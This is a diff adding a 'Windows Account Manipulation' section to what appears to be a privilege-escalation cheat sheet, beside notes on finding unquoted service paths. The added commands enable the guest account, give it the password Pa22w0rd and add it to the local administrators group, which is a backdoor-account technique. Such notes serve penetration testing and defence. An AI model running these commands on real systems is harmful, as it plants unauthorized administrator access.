@@ -52,3 +52,45 @@ You can search for services that have this vulnerability using:
 * PowerSploit ```Get-ServiceUnquoted cmdlet```
 * WMIC query ```wmic service get name,displayname,pathname,startmode |findstr /i “auto” |findstr /i /v “c:\windows\\” |findstr /i /v “””```
 
+### Windows Account Manipulation
+##### You will need administrator or SYSTEM level privilege to run some of these commands.
+
+To Do This Action:
+	
+
+Run This Command:
+
+List all users
+	
+
+net user
+
+See information about guest
+	
+
+net user guest
+
+Search the status of guest to determine if it's active (enabled) or not
+	
+
+net user guest | findstr /C:"active"
+
+Activate (enable) guest
+	
+
+net user guest /active:yes
+
+Set/change the guest password to Pa22w0rd
+	
+
+net user guest Pa22w0rd
+
+Add guest to the local administrators group
+	
+
+net localgroup administrators /add guest
+
+View the SID of each account
+	
+
+wmic useraccount get name,sid
